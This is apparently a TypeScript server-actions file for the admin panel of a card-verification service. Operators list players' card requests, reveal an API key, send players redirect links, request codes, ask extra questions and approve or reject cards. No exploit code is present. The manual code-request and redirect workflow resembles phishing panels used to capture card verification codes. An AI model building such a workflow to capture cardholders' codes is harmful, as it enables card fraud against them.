"use server"

import { and, count, desc, eq, ilike, or } from "drizzle-orm"
import { redirect } from "next/navigation"
import { revalidatePath } from "next/cache"
import { db } from "@/lib/db"
import { paymentCard, user } from "@/lib/db/schema"
import { isAdmin } from "@/lib/admin-auth"
import {
  CARD_EVENT_FOR_STATUS,
  cardPublicColumns,
  deliverCardEvent,
  deliveryLog,
  type DeliveryResult,
} from "@/lib/card-webhook"
import {
  decideCardRequest,
  normalizeReason,
  normalizeRedirectUrl,
  requestCardCode,
  requestCardExtraCheck,
  setCardRedirect,
  type CardDecision,
} from "@/lib/card-requests"

import { isCardStatus } from "@/lib/card-statuses"

export type ActionResult = { ok: true; message: string } | { ok: false; error: string }

const REQUEST_NO = /^BL-[A-HJ-NP-Z2-9]{6}$/
const MAX_QUESTION = 300

async function requireAdmin() {
  if (!(await isAdmin())) redirect("/admin/login")
}

function done(message: string): ActionResult {
  revalidatePath("/admin/api")
  return { ok: true, message }
}

const notFound: ActionResult = { ok: false, error: "Заявка не найдена или уже в другом статусе" }

function validNo(requestNo: unknown): requestNo is string {
  return typeof requestNo === "string" && REQUEST_NO.test(requestNo)
}

export type AdminCardRequest = Awaited<ReturnType<typeof listAdminCardRequests>>[number]

export async function listAdminCardRequests(status?: string, query?: string) {
  await requireAdmin()
  const q = query?.trim().slice(0, 64)
  const filters = [
    isCardStatus(status) ? eq(paymentCard.status, status) : undefined,
    q
      ? or(
          ilike(paymentCard.requestNo, `%${q}%`),
          ilike(paymentCard.last4, `%${q}%`),
          ilike(user.email, `%${q}%`),
          ilike(paymentCard.cardholder, `%${q}%`),
        )
      : undefined,
  ].filter(Boolean)
  return db
    .select({ ...cardPublicColumns, userEmail: user.email, userName: user.name })
    .from(paymentCard)
    .innerJoin(user, eq(user.id, paymentCard.userId))
    .where(filters.length ? and(...filters) : undefined)
    .orderBy(desc(paymentCard.createdAt))
    .limit(100)
}

export async function getCardStatusCounts(): Promise<Record<string, number>> {
  await requireAdmin()
  const rows = await db.select({ status: paymentCard.status, total: count() }).from(paymentCard).groupBy(paymentCard.status)
  return Object.fromEntries(rows.map((row) => [row.status, Number(row.total)]))
}

export async function getDeliveryLog(): Promise<DeliveryResult[]> {
  await requireAdmin()
  return deliveryLog()
}

export async function revealApiKey(): Promise<string | null> {
  await requireAdmin()
  return process.env.OPERATOR_API_KEY?.trim() || null
}

export async function adminSendRedirect(requestNo: string, rawUrl: string): Promise<ActionResult> {
  await requireAdmin()
  if (!validNo(requestNo)) return notFound
  const url = typeof rawUrl === "string" ? normalizeRedirectUrl(rawUrl) : null
  if (!url) return { ok: false, error: "Нужна ссылка, начинающаяся с https://" }
  return (await setCardRedirect(requestNo, url)) ? done("Ссылка отправлена игроку") : notFound
}

export async function adminRequestCode(requestNo: string): Promise<ActionResult> {
  await requireAdmin()
  if (!validNo(requestNo)) return notFound
  return (await requestCardCode(requestNo)) ? done("Игроку показано поле для кода") : notFound
}

export async function adminRequestExtraCheck(requestNo: string, rawQuestion: string): Promise<ActionResult> {
  await requireAdmin()
  if (!validNo(requestNo)) return notFound
  const question = typeof rawQuestion === "string" ? rawQuestion.trim().slice(0, MAX_QUESTION) : ""
  if (!question) return { ok: false, error: "Введите вопрос" }
  return (await requestCardExtraCheck(requestNo, question)) ? done("Вопрос отправлен игроку") : notFound
}

export async function adminDecide(requestNo: string, decision: CardDecision, rawReason: string): Promise<ActionResult> {
  await requireAdmin()
  if (!validNo(requestNo) || (decision !== "approve" && decision !== "reject")) return notFound
  const reason = normalizeReason(rawReason)
  if (decision === "reject" && !reason) return { ok: false, error: "Укажите причину отказа — её увидит игрок" }
  const changed = await decideCardRequest(requestNo, decision, reason)
  return changed ? done(decision === "approve" ? "Карта подтверждена" : "Заявка отклонена") : notFound
}

export async function adminResendEvent(requestNo: string): Promise<DeliveryResult | { ok: false; error: string; event: string; status: null; at: string }> {
  await requireAdmin()
  const at = new Date().toISOString()
  if (!validNo(requestNo)) return { ok: false, error: "Заявка не найдена", event: "-", status: null, at }
  const [row] = await db.select({ id: paymentCard.id, status: paymentCard.status }).from(paymentCard)
    .where(eq(paymentCard.requestNo, requestNo)).limit(1)
  if (!row) return { ok: false, error: "Заявка не найдена", event: "-", status: null, at }
  const event = CARD_EVENT_FOR_STATUS[row.status] ?? "card.created"
  const result = await deliverCardEvent(row.id, event, { resent: "true" }, [0])
  revalidatePath("/admin/api")
  return result
}
